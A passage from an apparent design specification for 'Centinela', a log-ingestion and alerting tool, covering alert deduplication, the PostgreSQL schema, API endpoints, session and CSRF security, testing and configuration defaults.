| `centinela-web-scanning-burst` | `event_count` | `centinela-web-not-found` | `source.ip`, `host.name` | 2m | `gte: 50` | false | medium | T1595.002 |

A staff member who mistypes a password twice and then logs in never reaches `centinela-ssh-bruteforce`, so `centinela-ssh-bruteforce-success` (which chains on it) cannot fire on background traffic.

## 7. Alerts

- Dedup key: `ruleId|groupKey` for correlations; `ruleId|host|<entity>` for single-event rules, where entity is the first present of `source.ip`, `user.name`, `Image`, otherwise empty.
- Suppression: if an alert with the same dedup key is `new` or `acknowledged` and its `lastSeen` is within 15 minutes of the new match, increment `count`, extend `lastSeen`, add event links (at most 100) and merge entities; otherwise create a new alert. S4 enforces this inside a transaction.
- Lifecycle: `new` → `acknowledged` → `closed`. Closing requires `resolution`. `closed` → `new` (reopen) is allowed. Every change updates `updatedAt` (and, after S6, writes the audit log).
- Sorting weight: informational 1, low 2, medium 3, high 4, critical 5.

## 8. Storage (PostgreSQL 16)

Migration `001` (S0, `packages/server/migrations/001_initial-schema.sql`):

```sql
CREATE TABLE events (
  id           uuid PRIMARY KEY,
  ts           timestamptz NOT NULL,
  ingested_at  timestamptz NOT NULL DEFAULT now(),
  source       text NOT NULL,
  host         text NOT NULL,
  category     text NOT NULL,
  action       text NOT NULL,
  outcome      text NOT NULL,
  user_name    text,
  src_ip       inet,
  src_port     integer,
  message      text NOT NULL,
  fields       jsonb NOT NULL DEFAULT '{}'::jsonb
);
CREATE INDEX events_ts_idx         ON events (ts DESC, id DESC);
CREATE INDEX events_source_ts_idx  ON events (source, ts DESC);
CREATE INDEX events_host_ts_idx    ON events (host, ts DESC);
CREATE INDEX events_src_ip_ts_idx  ON events (src_ip, ts DESC);
CREATE INDEX events_user_ts_idx    ON events (user_name, ts DESC);
CREATE INDEX events_action_ts_idx  ON events (action, ts DESC);
CREATE INDEX events_message_fts    ON events USING gin (to_tsvector('simple', message));

CREATE TABLE alerts (
  id          uuid PRIMARY KEY,
  rule_id     text NOT NULL,
  rule_title  text NOT NULL,
  rule_type   text NOT NULL CHECK (rule_type IN ('sigma', 'correlation')),
  level       text NOT NULL CHECK (level IN ('informational', 'low', 'medium', 'high', 'critical')),
  status      text NOT NULL DEFAULT 'new' CHECK (status IN ('new', 'acknowledged', 'closed')),
  resolution  text CHECK (resolution IN ('true_positive', 'false_positive', 'benign')),
  note        text,
  dedup_key   text NOT NULL,
  group_key   text,
  host        text,
  techniques  text[] NOT NULL DEFAULT '{}',
  tactics     text[] NOT NULL DEFAULT '{}',
  entities    jsonb NOT NULL DEFAULT '{"ips":[],"users":[],"hosts":[]}'::jsonb,
  first_seen  timestamptz NOT NULL,
  last_seen   timestamptz NOT NULL,
  count       integer NOT NULL DEFAULT 1,
  author      text,
  rule_url    text,
  license     text,
  created_at  timestamptz NOT NULL DEFAULT now(),
  updated_at  timestamptz NOT NULL DEFAULT now()
);
CREATE INDEX alerts_last_seen_idx    ON alerts (last_seen DESC, id DESC);
CREATE INDEX alerts_status_level_idx ON alerts (status, level);
CREATE INDEX alerts_rule_idx         ON alerts (rule_id);
CREATE INDEX alerts_dedup_open_idx   ON alerts (dedup_key) WHERE status <> 'closed';
CREATE INDEX alerts_techniques_idx   ON alerts USING gin (techniques);

CREATE TABLE alert_events (
  alert_id  uuid NOT NULL REFERENCES alerts (id) ON DELETE CASCADE,
  event_id  uuid NOT NULL,
  PRIMARY KEY (alert_id, event_id)
);

CREATE TABLE rule_state (
  rule_id     text PRIMARY KEY,
  enabled     boolean NOT NULL,
  updated_at  timestamptz NOT NULL DEFAULT now()
);
```

S6 adds `admin_sessions` (HMAC of the session token, user name, created, last seen, expiry, IP, user agent), `ingest_tokens` (SHA-256 of the secret, label, display prefix, created/last used/revoked timestamps and actors) and `audit_log` (time, actor, action, target, IP, `details` jsonb; `seq`, an identity column added by migration `003_audit-log-sequence.sql`, orders the rows) in migration `002_auth-sessions-tokens-audit.sql`. Integration tests create a throwaway schema per run and drop it afterwards.

## 9. HTTP API

JSON over HTTP, all under `/api`. Request and response schemas live in `packages/shared/src/api.ts`. Errors use `application/problem+json`: `{ "type", "title", "status", "detail", "errors"? }`. List endpoints use keyset pagination: `limit` (default 50, max 200) and an opaque `cursor` (base64url of `ts|id`); responses are `{ "items": [...], "nextCursor": string | null }`. Times are ISO 8601; `from`/`to` default to the last 24 hours. The `status` and `level` filters accept comma-separated lists (`level=high,critical`); boolean filters are `true`/`false`.

| Method and path | Purpose | Main parameters | Response |
| --- | --- | --- | --- |
| `GET /api/health` | liveness and database check | — | `{ status, db, version }` |
| `POST /api/ingest` | ingest lines from agents and scripts | query `source`, `host`, `tz`; body `text/plain` lines or `application/x-ndjson`; `Authorization: Bearer <token>` | `IngestSummary` |
| `POST /api/ingest/upload` | file upload from the dashboard | query `source`, `host`, `tz`; body `text/plain` (≤ 5 MB). No token: requires the dashboard session and the CSRF header (S6), in every environment | `IngestSummary` |
| `GET /api/events` | search events | `from`, `to`, `source`, `host`, `user`, `ip`, `action`, `outcome`, `q` (full text), `cursor`, `limit` | page of `NormalizedEvent` |
| `GET /api/events/:id` | one event | — | `NormalizedEvent` |
| `GET /api/alerts` | list alerts | `status`, `level`, `ruleId`, `technique`, `host`, `ip`, `user`, `from`, `to`, `cursor`, `limit` | page of `Alert` |
| `GET /api/alerts/:id` | alert detail | — | `{ alert, rule: RuleMeta, events: NormalizedEvent[] }` (first 100 events) |
| `PATCH /api/alerts/:id` | triage | body `{ status, resolution?, note? }` | `Alert` |
| `POST /api/alerts/bulk` | bulk triage | body `{ ids: string[], status, resolution? }` | `{ updated: number }` |
| `GET /api/rules` | list rules | `q`, `level`, `technique`, `origin`, `supported`, `enabled`, `cursor`, `limit` | page of `RuleMeta & { matches: number }` |
| `GET /api/rules/:id` | rule detail | — | `{ rule: RuleMeta, source: string }` (YAML text) |
| `PATCH /api/rules/:id` | enable or disable | body `{ enabled }` | `RuleMeta` |
| `GET /api/stats/overview` | dashboard numbers | `from`, `to`, `bucket` (`5m`, `1h`, `1d`) | `{ events, alerts: { total, byLevel, byStatus }, eventsOverTime, alertsOverTime, topSourceIps, topUsers, topRules }` |
| `GET /api/attack` | ATT&CK matrix data | `from`, `to` | `{ tactics: [{ id, shortname, name, techniques: [{ id, name, url, rules, alerts }] }] }` |
| `GET /api/stream` | live changes (SSE) | — | events `alert.created`, `alert.updated`, `ping` |
| `GET /api/rules/:id/playbook` | content pack (S7) | `lang` (`en` default, `es`) | `PlaybookResponse`: `{ ruleId, lang, playbook: { summary, whatItDetects, whyItMatters, triageSteps, falsePositives, responseSteps, severityRationale }, rule: { title, author, url, license }, generated: { tool, model, at, review, notice } }`; `404` when the rule is unknown or has no playbook |
| `POST /api/auth/login`, `POST /api/auth/logout`, `GET /api/auth/me` | session auth (S6) | login body `{ username, password }` | `SessionInfo` (`204` for logout) |
| `GET /api/tokens` | ingest tokens (S6) | — | `{ items: IngestToken[] }` (newest 200, revoked included, never secrets) |
| `POST /api/tokens` | create an ingest token (S6) | body `{ label }` | `201 { token: IngestToken, secret }` (secret shown once) |
| `POST /api/tokens/:id/revoke` | revoke an ingest token (S6) | — | `IngestToken` |
| `GET /api/audit` | audit log (S6) | `action`, `cursor`, `limit` | page of `AuditEntry` |

Since S6 every endpoint except `GET /api/health`, `POST /api/ingest` (bearer token) and `POST /api/auth/login` requires the dashboard session (`401` without it); state-changing requests also need the `X-CSRF-Token` header (`403` without it). See `docs/SECURITY.md`.

## 10. Realtime

`GET /api/stream` sends `text/event-stream` with `event: alert.created` / `event: alert.updated` and the `Alert` as JSON in `data`, plus a `ping` comment every 25 seconds. The hub keeps a bounded set of clients (default 50) and drops slow clients. The web client reconnects with backoff and refetches the alerts list after reconnecting.

## 11. Frontend (`packages/web`)

- Structure: `src/app` (router, providers, layout), `src/pages`, `src/features/<area>` (alerts, events, attack, rules, ingest, overview), `src/components/ui`, `src/api` (typed client and TanStack Query hooks), `src/i18n` (`en.json`, `es.json`), `src/mocks` (MSW handlers and fixtures).
- URL search params are the source of truth for filters, so every view is shareable.
- Visual direction: a calm, dense "SOC console". Dark theme by default with a light alternative; neutral slate surfaces, one accent color, severity colors used sparingly (badges, heatmap). Base text 14 px, tabular numbers, monospace (system stack, no web font downloads) for raw logs, IPs and hashes.
- Severity must be readable without color: badges carry the text label and an icon.
- Accessibility: visible focus, keyboard navigation in tables (arrow keys, Enter opens), drawers trap focus and close with Escape, charts have text alternatives.
- i18n: `en` and `es` (neutral Latin American Spanish), formatted dates and numbers per locale, technique names stay in English (official ATT&CK names).

## 12. Security design

- Trust boundaries: log sources → ingest endpoint (authenticated by token); browser → API (session cookie plus CSRF header, S6); repository → rules (trusted).
- Attacker-controlled data: every log line and every field derived from it. Rendered as text only, stored with parameterized queries, matched with linear-time regexes, never executed.
- Limits: 5 MB per ingest request, 8,192 characters per message, 1,000 lines per batch, rate limits on ingest and `/api/auth/*`, sign-in lockout, bounded SSE clients.
- Authentication (S6): one admin (argon2id hash in `ADMIN_PASSWORD_HASH`), server-side sessions in PostgreSQL behind an httpOnly `__Host-centinela` cookie, CSRF double-submit (`__Host-centinela-csrf` cookie repeated in `X-CSRF-Token`) on every state-changing request, ingest tokens stored hashed, audit log of analyst actions.
- Headers: API responses carry `helmet` headers with `default-src 'none'` and `Cache-Control: no-store`; the HTML (nginx in Docker, Vite in development) carries a strict Content Security Policy defined in `packages/web/security/headers.ts`.
- Secrets only in environment variables; production refuses to start with development defaults or without the admin credentials.
- `docs/THREAT_MODEL.md` has the full analysis; `docs/SECURITY.md` the operator's guide.

## 13. Testing strategy

| Layer | Tooling | Examples |
| --- | --- | --- |
| Unit | Vitest | parser cases, modifiers, condition grammar, correlation windows, alert dedup |
| Golden | Vitest | SigmaHQ regression samples must match their rules; content-pack fixtures (S7) |
| API | Vitest + Supertest + real PostgreSQL | each endpoint, validation errors, pagination |
| End to end | Vitest | loggen `--small` → pipeline → alerts compared with `ground-truth.json` |
| UI | Vitest + React Testing Library + MSW | filters, triage actions, i18n parity, hostile strings |

Tests never call external networks. Database tests use a throwaway schema.

## 14. Dependencies (installed by S0)

- Root (dev): `typescript`, `eslint`, `@eslint/js`, `typescript-eslint`, `eslint-plugin-react-hooks`, `eslint-plugin-react-refresh`, `globals`, `prettier`, `vitest`, `@vitest/coverage-v8`, `tsx`, `concurrently`.
- `packages/shared`: `zod`.
- `packages/server`: `express`, `helmet`, `express-rate-limit`, `pg`, `node-pg-migrate`, `pino`, `pino-http`, `yaml`, `uuid`, `re2-wasm`, `ipaddr.js`; dev: `@types/express`, `@types/pg`, `supertest`, `@types/supertest`, `pino-pretty`.
- `packages/web`: `react`, `react-dom`, `react-router`, `@tanstack/react-query`, `recharts`, `i18next`, `react-i18next`, `clsx`, `lucide-react`; dev: `vite`, `@vitejs/plugin-react`, `tailwindcss`, `@tailwindcss/vite`, `@testing-library/react`, `@testing-library/jest-dom`, `@testing-library/user-event`, `jsdom`, `msw`.
- `packages/loggen`: no runtime dependencies (own PRNG); uses `@centinela/shared` types.
- Later sessions may add: `argon2` (S6, added to `packages/server`), a CSP helper if needed (S6: not needed, the policy is a plain string in `packages/web/security/headers.ts`).

## 15. Configuration

| Variable | Development default | Notes |
| --- | --- | --- |
| `NODE_ENV` | `development` | `production` enables strict checks |
| `PORT` | `3000` | API server |
| `DATABASE_URL` | `postgres://centinela:centinela@localhost:5432/centinela` | |
| `LOG_LEVEL` | `info` | pino level |
| `INGEST_TOKEN` | `dev-ingest-token-change-me` | required, at least 32 characters, in production |
| `RULES_DIR` | `./rules` | |
| `CONTENT_DIR` | `./content` | S7 |
| `TRUST_PROXY` | `false` | set when behind a reverse proxy (rate limiting, lockout and audit by client IP): a hop count (1–32) or a comma-separated list of proxy addresses, subnets or `loopback`/`linklocal`/`uniquelocal`; `true` is refused (S6) |
| `ADMIN_USERNAME` | `admin` | S6; required in production |
| `ADMIN_PASSWORD_HASH` | argon2id hash of `centinela-dev` | S6; required in production (`npm run hash-password`), argon2id with m ≥ 19456 and t ≥ 2, never the development password |
| `SESSION_SECRET` | `dev-session-secret-change-me` | S6; keys session ids and CSRF tokens; required, at least 32 characters, in production |
| `SESSION_IDLE_MINUTES`, `SESSION_MAX_HOURS` | `120`, `12` | S6; idle and absolute session lifetime (at most 168 hours) |
| `LOGIN_MAX_FAILURES`, `LOGIN_LOCKOUT_MINUTES` | `5`, `15` | S6; per-IP sign-in lockout |
| `RATE_LIMIT_INGEST_PER_MINUTE`, `RATE_LIMIT_UPLOAD_PER_MINUTE`, `RATE_LIMIT_AUTH_PER_MINUTE` | `120`, `30`, `30` | per client IP (S1's constants, moved to configuration in S6) |
| `VITE_USE_MOCKS` | `false` | web: use MSW instead of the API |
